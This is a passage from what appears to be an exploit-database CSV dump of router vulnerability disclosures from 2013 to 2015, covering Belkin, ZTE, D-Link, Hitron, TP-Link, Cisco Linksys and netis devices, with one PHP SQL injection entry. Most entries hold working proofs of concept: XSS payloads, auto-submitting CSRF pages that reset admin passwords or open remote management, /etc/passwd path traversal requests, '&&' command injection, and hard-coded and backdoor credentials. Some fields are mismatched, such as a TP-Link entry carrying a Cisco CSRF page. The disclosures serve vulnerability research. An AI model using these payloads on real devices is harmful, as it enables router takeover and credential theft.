%3AInternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language=""><script>alert(""1"")</script><script>""&obj-action=set&var%3Apage=deviceinfo&var%3Aerrorpage=deviceinfo&getpage=html%2Findex.html&errorpage=html%2Findex.html&var%3ACacheLastData=U1BBTl9UaW1lTnVtMT0%3D
2)
• Vulnerability Title  :  Session Hijacking
• Version              :  F9K1009 v1
• Firmware             :  1.00.09
→ Proof of Concept:
Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT
sessionid is allocated using hex encoding and of fixed length i.e 8 .
Therefore, it is very easy to bruteforce it in feasible amount for time as
this session id ranges from 00000000 to ffffffff
→ Steps to Reproduce:
Send the following request using Burpsuite and Bruteforce the sessionid.
POST /cgi-bin/webproc HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101
Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer:
Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT
3)
• Vulnerability Title  :  Telnet Enabled with Default Pass
• Version              :  F9K1009 v1
• Firmware             :  1.00.09
→ Vulnerability Details:
Telnet protocol can be used by an attacker to gain remote access to the
router with root privileges.
→ Proof of Concept:
→ Steps to Reproduce:
1) Open terminal
2) Type following command:
telnet 192.168.2.1
3) Default user and pass is root:root
4)
• Vulnerability Title  :  Cross Site Request Forgery
• Version              :  F9K1009 v1
• Firmware             :  1.00.09
→ Proof of Concept:
Request doesn't contain any CSRF-token. Therefore, requests can be forged.
It can be verified with any request.
Status:
Vendor Notified: 20 Oct 2015
Vendor Notified Again:  25 Nov 2015
No Response.
Full Disclosure: 30 Nov 2015
Ref:"
2015-11-20,WebApps,Hardware,Karn Ganeshen,ZTE ZXHN H108N R1A / ZXV10 W300 Routers,Multiple Vulnerabilities,"# Exploit Title: [ZTE ZXHN H108N R1A + ZXV10 W300 routers - multiple
# Discovered by: Karn Ganeshen
# CERT VU# 391604
# Vendor Homepage: [www.zte.com.cn]
# Versions Reported
# ZTE ZXHN H108N R1A - Software version ZTE.bhs.ZXHNH108NR1A
# ZTE ZXV10 W300 - Software version - w300v1.0.0f_ER1_PE
http://<IP>/cgi-bin/webproc
//get user info
http://
#root:x:0:0:root:/root:/bin/bash
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh","vulnerabilities]
Overview
ZTE ZXHN H108N R1A router, version ZTE.bhs.ZXHNH108NR1A.h_PE, and ZXV10
W300 router, version W300V1.0.0f_ER1_PE, contain multiple vulnerabilities.
*CVE-ID*:
CVE-2015-7248
CVE-2015-7249
CVE-2015-7250
CVE-2015-7251
CVE-2015-7252
*Note*: Large deployment size, primarily in Peru, used by TdP.
Description
*CWE-200* <https://cwe.mitre.org/data/definitions/200.html>*: Information
Exposure* - CVE-2015-7248
Multiple information exposure vulnerabilities enable an attacker to obtain
credentials and other sensitive details about the ZXHN H108N R1A.
A. User names and password hashes can be viewed in the page source of
PoC:
Login Page source contents:
...snip....
var G_UserInfo = new Array();
var m = 0;
G_UserInfo[m] = new Array();
G_UserInfo[m][0] = ""admin""; //UserName
G_UserInfo[m][1] = ""$1$Tsnipped/; //Password Hash seen here
G_UserInfo[m][2] = ""1""; //Level
G_UserInfo[m][3] = ""1""; //Index
m++;
G_UserInfo[m] = new Array();
G_UserInfo[m][0] = ""user""; //UserName
G_UserInfo[m][1] = ""$1$Tsnipped""; //Password Hash seen here
G_UserInfo[m][2] = ""2""; //Level
G_UserInfo[m][3] = ""2""; //Index
m++;
G_UserInfo[m] = new Array();
G_UserInfo[m][0] = ""support""; //UserName
G_UserInfo[m][1] = ""$1$Tsnipped""; //Password Hash seen here
G_UserInfo[m][2] = ""2""; //Level
G_UserInfo[m][3] = ""3""; //Index
m++;
...snip...
B. The configuration file of the device contains usernames, passwords,
keys, and other values in plain text, which can be used by a user with
lower privileges to gain admin account access. This issue also affects ZTE
ZXV10 W300 models, version W300V1.0.0f_ER1_PE.
*CWE-285* <https://cwe.mitre.org/data/definitions/285.html>*: Improper
Authorization* - CVE-2015-7249
By default, only admin may authenticate directly with the web
administration pages in the ZXHN H108N R1A. By manipulating parameters in
client-side requests, an attacker may authenticate as another existing
account, such as user or support, and may be able to perform actions
otherwise not allowed.
PoC 1:
1. Login page user drop-down option shows only admin only.
2. Use an intercepting proxy / Tamper Data - and intercept the Login submit
request.
3. Change the username admin to user / support and continue Login.
4. Application permits other users to log in to mgmt portal.
PoC 2:
After logging in as support, some functional options are visibly
restricted. Certain actions can still be performed by calling the url
directly. Application does not perform proper AuthZ checks.
Following poc is a change password link. It is accessible directly, though
it (correctly) is restricted to changing normal user (non-admin) password
only.
<IP>/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=accessctrl&var:subpage=accountpsd
Other functions / pages may also be accessible to non-privileged users.
*CWE-22* <http://cwe.mitre.org/data/definitions/22.html>*: Improper
Limitation of a Pathname to a Restricted Directory ('Path Traversal') *-
CVE-2015-7250
The webproc cgi module of the ZXHN H108N R1A accepts a getpage parameter
which takes an unrestricted file path as input, allowing an attacker to
read arbitrary files on the system.
Arbitrary files can be read off of the device. No authentication is
required to exploit this vulnerability.
PoC
HTTP POST request
POST /cgi­bin/webproc HTTP/1.1
Host: IP
User­Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101
Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept­Language: en­US,en;q=0.5
Accept­Encoding: gzip, deflate
Referer: https://IP/cgi­bin/webproc
Cookie: sessionid=7ce7bd4a; language=en_us; sys_UserName=admin
Connection: keep­alive
Content­Type: application/x­www­form­urlencoded
Content­Length: 177
getpage=html%2Findex.html&errorpage=%2fetc%2fpasswd&var%3Amenu=setup&var%3Apage=wancfg&obj­
action=auth&%3Ausername=admin&%3Apassword=admin&%3Aaction=login&%3Asessionid=7ce7bd4a
HTTP Response
HTTP/1.0 200 OK
Content­type: text/html
Pragma: no­cache
Cache­Control: no­cache
set­cookie: sessionid=7ce7bd4a; expires=Fri, 31­Dec­9999 23:59:59
GMT;path=/
root:x:0:0:root:/root:/bin/sh
*CWE-798* <http://cwe.mitre.org/data/definitions/798.html>*: Use of
Hard-coded Credentials* - CVE-2015-7251
In the ZXHN H108N R1A, the Telnet service, when enabled, is accessible
using the hard-coded credentials 'root' for both the username and password.
*CWE-79* <https://cwe.mitre.org/data/definitions/79.html>*: Improper
Neutralization of Input During Web Page Generation ('Cross-site
Scripting') *- CVE-2015-7252
In the ZXHN H108N R1A, the errorpage parameter of the webproc cgi module is
vulnerable to reflected cross-site scripting [pre-authentication].
PoC
POST /cgi­bin/webproc HTTP/1.1
Host: IP
User­Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101
Firefox/18.0 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept­Language: en­US,en;q=0.5
Accept­Encoding: gzip, deflate
Referer: https://IP/cgi­bin/webproc
Cookie: sessionid=7ce7bd4a; language=en_us; sys_UserName=admin
Connection: keep­alive
Content­Type: application/x­www­form­urlencoded
Content­Length: 177
getpage=html%2Findex.html&*errorpage*=html%2fmain.html<script>alert(1)</script>&var%3Amenu=setup&var%3Apage=wancfg&obj­
action=auth&%3Ausername=admin&%3Apassword=admin&%3Aaction=login&%3Asessionid=7ce7bd4a
Best Regards,
Karn Ganeshen"
2015-11-16,WebApps,Hardware,Bhadresh Patel,D-Link DIR-816L Wireless Router,Cross-Site Request Forgery,,"Title:
D-link wireless router DIR-816L – Cross-Site Request Forgery (CSRF) vulnerability
Credit:
Name: Bhadresh Patel
Company/affiliation: HelpAG
Website: www.helpag.com
CVE:
CVE-2015-5999
Date:
10-11-2015 (dd/mm/yyyy)
Vendor:
D-Link is a computer networking company with relatively modest beginnings in Taiwan. The company has grown over the last 25 years into an exciting global brand offering the most up-to-date network solutions. Whether it is to suit the needs of the home consumer, a business or service provider, D-link take pride in offering award-winning networking products and services.
Product:
DIR-816L is a wireless AC750 Dual Band Cloud Router
Product link: http://support.dlink.com/ProductInfo.aspx?m=DIR-816L
Abstract:
Cross-Site Request Forgery (CSRF) vulnerability in the DIR-816L wireless router enables an attacker to perform an unwanted action on a wireless router for which the user/admin is currently authenticated.
Report-Timeline:
27-07-2015: Vendor notification
27-07-2015: Vendor Response/Feedback
05-11-2015: Vendor Fix/Patch
10-11-2015: Public or Non-Public Disclosure
Affected Version:
<=2.06.B01
Exploitation-Technique:
Remote
Severity Rating:
7.9 (AV:A/AC:M/Au:N/C:C/I:C/A:C)
Details:
An attacker who lures a DIR-816L authenticated user to browse a malicious website can exploit cross site request forgery (CSRF) to submit commands to DIR-816L wireless router and gain control of the product. The attacker could submit variety of commands including but not limited to changing the admin account password, changing the network policy, etc.
Proof Of Concept:
1) User login to DIR-816L wireless router
2) User visits the attacker's malicious web page (attacker.html)
3) attacker.html exploits CSRF vulnerability and changes the admin account password
PoC video link: http://youtu.be/UBdR2sUc8Wg
Exploit code (attacker.html):
<html>
<body>
<iframe style=""display:none"" name=""hiddenpost""></iframe>
<form action=""http://192.168.0.1/hedwig.cgi"" method=""POST"" enctype=""text/plain"" target=""hiddenpost"" id=""csrf"">
<input type=""hidden"" name=""<&#63;xml&#32;version"" value=""""1&#46;0""&#32;encoding&#61;""UTF&#45;8""&#63;>&#10;<postxml>&#10;<module>&#10;&#9;<service>DEVICE&#46;ACCOUNT<&#47;service>&#10;&#9;<device>&#10;&#9;&#9;<gw&#95;name>DIR&#45;816L<&#47;gw&#95;name>&#10;&#9;&#9;&#10;&#9;&#9;<account>&#10;&#9;&#9;&#9;<seqno>1<&#47;seqno>&#10;&#9;&#9;&#9;<max>2<&#47;max>&#10;&#9;&#9;&#9;<count>1<&#47;count>&#10;&#9;&#9;&#9;<entry>&#10;&#9;&#9;&#9;&#9;<uid>USR&#45;<&#47;uid>&#10;&#9;&#9;&#9;&#9;<name>Admin<&#47;name>&#10;&#9;&#9;&#9;&#9;<usrid&#47;>&#10;&#9;&#9;&#9;&#9;<password>password<&#47;password>&#10;&#9;&#9;&#9;&#9;<group>0<&#47;group>&#10;&#9;&#9;&#9;&#9;<description&#47;>&#10;&#9;&#9;&#9;<&#47;entry>&#10;&#9;&#9;<&#47;account>&#10;&#9;&#9;<group>&#10;&#9;&#9;&#9;<seqno&#47;>&#10;&#9;&#9;&#9;<max&#47;>&#10;&#9;&#9;&#9;<count>0<&#47;count>&#10;&#9;&#9;<&#47;group>&#10;&#9;&#9;<session>&#10;&#9;&#9;&#9;<captcha>1<&#47;captcha>&#10;&#9;&#9;&#9;<dummy&#47;>&#10;&#9;&#9;&#9;<timeout>180<&#47;timeout>&#10;&#9;&#9;&#9;<maxsession>128<&#47;maxsession>&#10;&#9;&#9;&#9;<maxauthorized>16<&#47;maxauthorized>&#10;&#9;&#9;<&#47;session>&#10;&#9;<&#47;device>&#10;<&#47;module>&#10;<module>&#10;&#9;<service>HTTP&#46;WAN&#45;1<&#47;service>&#10;&#9;<inf>&#10;&#9;&#9;<web><&#47;web>&#10;&#9;&#9;<https&#95;rport><&#47;https&#95;rport>&#10;&#9;&#9;<stunnel>1<&#47;stunnel>&#10;&#9;&#9;<weballow>&#10;&#9;&#9;&#9;<hostv4ip&#47;>&#10;&#9;&#9;<&#47;weballow>&#10;&#9;&#9;<inbfilter&#47;>&#10;&#9;<&#47;inf>&#10;&#9;&#10;<&#47;module>&#10;<module>&#10;&#9;<service>HTTP&#46;WAN&#45;2<&#47;service>&#10;&#9;<inf>&#10;&#9;&#9;<active>0<&#47;active>&#10;&#9;&#9;<nat>NAT&#45;1<&#47;nat>&#10;&#9;&#9;<web&#47;>&#10;&#9;&#9;<weballow>&#10;&#9;&#9;&#9;<hostv4ip&#47;>&#10;&#9;&#9;<&#47;weballow>&#10;&#9;<&#47;inf>&#10;&#9;&#10;<&#47;module>&#10;<module>&#10;&#9;<service>INBFILTER<&#47;service>&#10;&#9;<acl>&#10;&#9;&#9;<inbfilter>&#9;&#9;&#10;&#9;&#9;&#9;&#9;&#9;&#9;<seqno>1<&#47;seqno>&#10;&#9;&#9;&#9;<max>24<&#47;max>&#10;&#9;&#9;&#9;<count>0<&#47;count>&#10;&#10;&#9;&#9;<&#47;inbfilter>&#9;&#9;&#10;&#9;<&#47;acl>&#10;&#9;<ACTIVATE>ignore<&#47;ACTIVATE>&#10;<FATLADY>ignore<&#47;FATLADY><SETCFG>ignore<&#47;SETCFG><&#47;module>&#10;<module>&#10;&#9;<service>SHAREPORT<&#47;service>&#10;&#9;<FATLADY>ignore<&#47;FATLADY>&#10;&#9;&#10;<ACTIVATE>ignore<&#47;ACTIVATE><&#47;module>&#10;<module>&#10;&#9;<service>SAMBA<&#47;service>&#10;&#9;<samba>&#9;&#9;&#10;&#9;&#9;&#32;&#32;&#32;&#32;&#10;&#9;&#9;<enable>1<&#47;enable>&#10;&#9;&#9;<auth>1<&#47;auth>&#10;&#10;&#32;&#32;&#32;&#32;<&#47;samba>&#10;<&#47;module>&#10;<&#47;postxml>"" />
</form>
<script>alert(""This is CSRF PoC"");document.getElementById(""csrf"").submit()</script>
<iframe style=""display:none"" name=""hiddencommit""></iframe>
<form action=""http://192.168.0.1/pigwidgeon.cgi"" method=""POST"" target=""hiddencommit"" id=""csrf1"">
<input type=""hidden"" name=""ACTIONS"" value=""SETCFG&#44;SAVE&#44;ACTIVATE"" />
</form>
<script>document.getElementById(""csrf1"").submit()</script>
</body>
</html>
Patched/Fixed Firmware and notes:
2.06.B09_BETA  --  ftp://FTP2.DLINK.COM/SECURITY_ADVISEMENTS/DIR-816L/DIR-816L_REVB_FIRMWARE_PATCH_2.06.B09_BETA.ZIP
2.06.B09_BETA  --  ftp://FTP2.DLINK.COM/SECURITY_ADVISEMENTS/DIR-816L/DIR-816L_REVB_FIRMWARE_PATCH_NOTES_2.06.B09_BETA_EN.PDF
Credits:
Bhadresh Patel
Senior Security Analyst
HelpAG (www.helpag.com)"
2015-10-30,WebApps,Hardware,Dolev Farhi,Hitron Router CGN3ACSMR 4.5.8.16,Arbitrary Code Execution,"# Exploit title: Hitron Router (CGN3ACSMR) - Remote Code Execution
# Author: Dolev Farhi (dolevf at protonmail.ch)
# Date: 29-10-2015
# Vendor homepage: http://www.hitrontech.com/en/index.php
# Software version: 4.5.8.16
# Hardware version: 1A
# Details:
# Steps to reproduce:","Hitron routers provide an interface to test connectivity (ping, tracert) via the graphical user interface of the router (Management UI).
This interface is vulnerable to code injection using the && argument after the IP address.
1. Navigate to the dashboard
2. Navigate to the admin tab
3. Type an ip address in the Destination form
4. append any code you want after the ip.
Example one:
8.8.8.8 && cat /etc/passwd
Result
root:$1$27272727:0:0::/:/bin/false
nobody:$1$27272727:65535:65535::/:/bin/false
rogcesadmin:filtered/:100:100::/:/usr/sbin/cli
=============Complete==============
Example two:
8.8.8.8 && ip a
PID USER VSZ STAT COMMAND
1 root 1268 S init
2 root 0 SW [kthreadd]
3 root 0 SW [ksoftirqd/0]
5 root 0 SW [kworker/u:0]
6 root 0 SW< [khelper]
7 root 0 SW [irq/74-hw_mutex]
8 root 0 SW [sync_supers]
9 root 0 SW [bdi-default]
10 root 0 SW< [kblockd]
11 root 0 SW< [gPunitWorkqueue]
12 root 0 SW [irq/79-punit_in]
13 root 0 SW [kswapd0]
14 root 0 SW< [crypto]"
2013-04-25,Remote,Hardware,Jacob Holcomb,Belkin F5D8236-4 Router,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/59476/info,"Belkin F5D8236-4 Router is prone to a cross-site request-forgery vulnerability.
Attackers can exploit this issue to perform certain administrative actions and gain unauthorized access to the affected device.
<html> <head> <title>Belkin F5D8236-4 v2 CSRF - Enable Remote MGMT.</title> <!-- Use JavaScript debugging to bypass authentication --> <!--*Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators --> </head> <body> <form name=""belkin"" action=""http://X.X.X.X/cgi-bin/system_setting.exe"" method=""post""/> <input type=""hidden"" name=""remote_mgmt_enabled"" value=""1""/> <input type=""hidden"" name=""remote_mgmt_port"" value=""31337""/> <input type=""hidden"" name=""allow_remote_ip"" value=""0""/> </form> <script> function BeLkIn() {document.belkin.submit();}; window.setTimeout(BeLkIn, 0000); </script> <body> </html>"
2013-04-23,DoS,Hardware,Carl Benedict,Cisco Linksys WRT310N Router,Multiple Denial of Service Vulnerabilities,"source: https://www.securityfocus.com/bid/59445/info
http://www.example.com/apply.cgi?pptp_dhcp=0&submit_button=index&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&dhcp_check=&lan_netmask_0=&lan_netmask_1=&lan_netmask_2=&lan_netmask_3=&timer_interval=30&language=EN&wan_proto=dhcp&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=255.255.255.0&url_address=my.wrt310n&lan_proto=dhcp&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=AAAAAAAAAAAAAAAAAAA&time_zone=-08+1+1&_daylight_time=1","The Cisco Linksys WRT310N Router is prone to multiple denial-of-service vulnerabilities when handling specially crafted HTTP requests.
Successful exploits will cause the device to crash, denying service to legitimate users."
2013-04-24,Remote,Hardware,Jacob Holcomb,TP-Link TL-WR1043N Router,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/59442/info,"The TP-Link TL-WR1043N Router is prone to a cross-site request-forgery vulnerability.
Attackers can exploit this issue to perform certain administrative actions and gain unauthorized access to the affected device.
d> <title>Cisco WRT310Nv2 Firmware v2.0.01 CSRF/XSS</title> <!--*Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators --> </head> <body> <form name=""CSRFxssPWN"" action=""http://ww.example.com/apply.cgi"" method=""post""/> <input type=""hidden"" name=""submit_button"" value=""Management""/> <input type=""hidden"" name=""action"" value=""Apply""/> <input type=""hidden"" name=""PasswdModify"" value=""1""/> <input type=""hidden"" name=""http_enable"" value=""1""/> <input type=""hidden"" name=""wait_time"" value=""0""/> <input type=""hidden"" name=""http_passwd"" value=""ISE_1337""/> <input type=""hidden"" name=""http_passwdConfirm"" value=""ISE_1337""/> <input type=""hidden"" name=""_http_enable"" value=""1""/> <input type=""hidden"" name=""remote_management"" value=""1""/> <input type=""hidden"" name=""remote_upgrade"" value=""1""/> <input type=""hidden"" name=""remote_ip_any"" value=""1""/> <input type=""hidden"" name=""http_wanport"" value=""1337""/> <input type=""hidden"" name=""upnp_enable"" value=""1""/> <input type=""hidden"" name=""upnp_config"" value=""1""/> <input type=""hidden"" name=""upnp_internet_dis"" value=""1""/> </form> <script> function PwN() {document.CSRFxssPWN.submit();}; window.setTimeout(PwN, 0025); </script> <body> </html>"
2015-10-19,WebApps,Hardware,Rahul Pratap Singh,Belkin N150 Router 1.00.08/1.00.09,Directory Traversal,"# Title: Path Traversal Vulnerability
# Product: Belkin Router N150
# Author: Rahul Pratap Singh
# Website: https://0x62626262.wordpress.com
# Contact:
# Vendor Homepage: http://www.belkin.com
# Firmware Tested: 1.00.08, 1.00.09
# CVE: 2014-2962
Description:
http://192.168.2.1/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo
#root:x:0:0:root:/root:/bin/bash root:x:0:0:root:/root:/bin/sh
#tw:x:504:504::/home/tw:/bin/bash #tw:x:504:504::/home/tw:/bin/msh
https://www.kb.cert.org/vuls/id/774788
https://0x62626262.wordpress.com/category/full-disclosure/","Linkedin: https://in.linkedin.com/in/rahulpratapsingh94
Twitter: @0x62626262
Belkin N150 wireless router firmware versions 1.00.07 and earlier contain a
path traversal vulnerability through the built-in web interface. The
webproc cgi
module accepts a getpage parameter which takes an unrestricted file path as
input. The web server runs with root privileges by default, allowing a
malicious attacker to read any file on the system.
A patch was released by Belkin but that is still vulnerable.
POC:
Ref:"
2013-04-19,DoS,Hardware,W1ckerMan,TP-Link TL-WR741N / TL-WR741ND Routers,Multiple Denial of Service Vulnerabilities,source: https://www.securityfocus.com/bid/59325/info,"TP-LINK TL-WR741N and TL-WR741ND routers are prone to multiple denial-of-service vulnerabilities when handling specially crafted HTTP requests.
Successful exploits will cause the device to crash, denying service to legitimate users.
GET http://www.example.com:80/userRpm/DdnsAddRpm.htm?provider=4 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://www.example.com/userRpm/DdnsAddRpm.htm?provider=4
Authorization: Basic YWRtaW46YWRtaW4=
GET http://www.example.com:80/help/../../root HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://www.example.com/help/"
2015-10-15,WebApps,Hardware,Karn Ganeshen,netis RealTek Wireless Router / ADSL Modem,Multiple Vulnerabilities,"# Exploit Title: [netis RealTek wireless router / ADSL modem Multiple
# Discovered by: Karn Ganeshen
# Reported on: [October 13, 2015]
# Vendor Response: [Vulnerability? What's this?]
# Vendor Homepage: [www.netis-systems.com]
# Version Affected: [Firmware version RTK v2.1.1]
http://<IP>/fw-macfilter.htm","Vulnerabilities]
**Vulnerability Details**
* 1. Default, weak passwords for http and ftp services *
a. *HTTP accounts*
- guest/guest
- user/user
- guest/XXXXairocon
<chain N=""USERNAME_PASSWORD"">
<V N=""FLAG"" V=""0x0""/>
<V N=""USERNAME"" V=""guest""/>
<V N=""PASSWORD"" V=""guest""/>
<V N=""BACKDOOR"" V=""0x0""/>
<V N=""PRIORITY"" V=""0x2""/>
</chain>
<chain N=""USERNAME_PASSWORD"">
<V N=""FLAG"" V=""0x0""/>
<V N=""USERNAME"" V=""user""/>
<V N=""PASSWORD"" V=""user""/>
<V N=""BACKDOOR"" V=""0x0""/>
<V N=""PRIORITY"" V=""0x0""/> </chain>
<chain N=""USERNAME_PASSWORD"">
<V N=""FLAG"" V=""0x0""/>
<V N=""USERNAME"" V=""guest""/>
<V N=""PASSWORD"" V=""XXXXairocon""/>
<V N=""BACKDOOR"" V=""0x1""/>
<V N=""PRIORITY"" V=""0x1""/> </chain>
*XXXX -> last four digits of MAC address *
b. *FTP accounts*
- admin/admin
- useradmin/useradmin
- user/user
<chain N=""FTP_SERVER"">
<V N=""ENABLE"" V=""0x1""/>
<V N=""USERNAME"" V=""admin""/>
<V N=""PASSWORD"" V=""admin""/>
<V N=""PORT"" V=""0x15""/>
<V N=""USERRIGHT"" V=""0x3""/>
<V N=""INSTNUM"" V=""0x1""/> </chain>
<chain N=""FTP_SERVER"">
<V N=""ENABLE"" V=""0x1""/>
<V N=""USERNAME"" V=""useradmin""/>
<V N=""PASSWORD"" V=""useradmin""/>
<V N=""PORT"" V=""0x15""/>
<V N=""USERRIGHT"" V=""0x2""/>
<V N=""INSTNUM"" V=""0x2""/> </chain>
<chain N=""FTP_SERVER"">
<V N=""ENABLE"" V=""0x1""/>
<V N=""USERNAME"" V=""user""/>
<V N=""PASSWORD"" V=""user""/>
<V N=""PORT"" V=""0x15""/>
<V N=""USERRIGHT"" V=""0x1""/>
<V N=""INSTNUM"" V=""0x3""/> </chain>
2. *Backdoor accounts*
The device comes configured with privileged, backdoor account.
For HTTP, 'guest' with attribute <V N=""BACKDOOR"" V=""0x1""/>, is the backdoor
account. This is seen in the config file:
<chain N=""USERNAME_PASSWORD"">
<V N=""FLAG"" V=""0x0""/>
<V N=""USERNAME"" V=""guest""/>
<V N=""PASSWORD"" V=""XXXXairocon""/>
<V N=""BACKDOOR"" V=""0x1""/>
<V N=""PRIORITY"" V=""0x1""/>
</chain>
This user is not shown / visible in the user list when logged in as guest
(privileged user).
3. *No CSRF protection*
There is no CSRF token set in any of the forms / pages.
It is possible to silently execute HTTP requests if the user is logged in.
4. *Weak RBAC controls *
5a) *A non-root/non-admin user (user) can create and delete any other
users, including root-privileged accounts. *
In netis RealTek wireless router ADSL modem, there are three users:
guest:guest -> priv 2 is super user account with full functional access
user:user -> priv 0 -> can access only some functions
guest:XXXXairocon -> privileged backdoor login
*Normally: *
- user can create new account with restricted user privs only.
- user can change its password and only other non-root users.
- user can delete any other non-root users.
However, the application does not enforce strict rbac and it is possible
for a non-root user to create a new user with root privileges.
This is done as follows:
1. Start creating a new user, and intercepting the user creation POST
request
2. Intercept & Change privilege parameter value from 0 (user) to 2 (root) -
Submit request
3. When the new root user is created successfully, it does not show up in
user list
4. Confirm via logging in as new root, and / or configured accounts in
configuration file (config.img)
This is the POST request to create a new user:
*Create user http request*:
POST /form2userconfig.cgi HTTP/1.1
Host: <IP>
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101
Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://<IP>/userconfig.htm?v=
Cookie: SessionID=
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
username=test&privilege=2&newpass=test&confpass=test&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=
*Note1*: In some cases, this password change function is not accessible to
'user' via GUI. But we can still send a POST request to create a valid, new
root privileged account.
*Note2*: In some cases, application does not create root priv user, in the
first attempt. However, in the 2nd or 3rd attempt, new user is created
without any issue.
*Delete user http request:*
A non-root/non-admin user can delete any configured user(s) including
privileged users (guest).
POST /form2userconfig.cgi HTTP/1.1
Host: <ip>
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101
Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://<IP>/userconfig.htm
Cookie: SessionID=
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
username=test&privilege=2&oldpass=&newpass=&confpass=&deluser=Delete&select=s3&hiddenpass=test&submit.htm%
In case (non-root) user is deleting a root login (guest, priv 2), action
status can be confirmed by checking the configuration In case (non-root)
user is deleting a user login (priv 0), action status can be confirmed by
checking the user list.
5b) *(non-root priv) User can access unauthorized functions.*
Normally, 'user' does not have access to all the functionality of the
device. It has access to Status, Setup and Maintenance.
However, few functions can still be accessed by calling them directly. For
example, to access the mac filtering configuration this url can be opened
directly:
Other functions may also be accessible in this manner.
6. *Sensitive information not secured from low privileged users *
A non-root / non-admin privileged user has access to download the
configuration file - config.img.
This file contains clear-text passwords, keys and other sensitive
information which can be used to gain privileged access.
7. *Sensitive information accessible in clear-text*
Sensitive Information like passwords and keys are not secured properly.
Mostly these are either shown in clear-text or cen censored *****, it is
possible to view clear-text values by 'Inspect Element' locally or
intercepting http requests, or sniffing.
Best Regards,
Karn Ganeshen"
2013-04-15,Remote,Hardware,Phil Purviance,Cisco Linksys EA2700 Router,Multiple Vulnerabilities,source: https://www.securityfocus.com/bid/59054/info,"Cisco Linksys EA2700 routers is prone to the following security vulnerabilities:
1. A security-bypass vulnerability
2. A cross-site request-forgery vulnerability
3. A cross-site scripting vulnerability
An attacker can exploit these issues to bypass certain security restrictions, steal cookie-based authentication credentials, gain access to system and other configuration files, or perform unauthorized actions in the context of a user session.
Cisco Linksys EA2700 running firmware 1.0.12.128947 is vulnerable.
The following example request is available:
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
submit_button=xss'%3balert(1)//934&action=Apply"
2013-04-05,WebApps,PHP,Jurgen Voorneveld,PHP Address Book,'/addressbook/register/router.php?BasicLogin' Cookie SQL Injection,"source: https://www.securityfocus.com/bid/58911/info
http://www.example.com/addressbook/register/router.php COOKIE var BasicLogin","PHP Address Book is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input.
A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
PHP Address Book 8.2.5 is vulnerable; other versions may also be affected."
2015-10-06,WebApps,Hardware,Todor Donev,ZTE ZXHN H108N Router,Configuration Disclosure,"http://www.ethical-hacker.org/
https://www.facebook.com/ethicalhackerorg
http://pastebin.com/u/hackerscommunity
Description:","ZTE ZXHN H108N unauthenticated config download
Copyright 2015 (c) Todor Donev
todor.donev@gmail.com
Tested device:
Model                           ZXHN H108N
Software Version                V3.3.0_MU
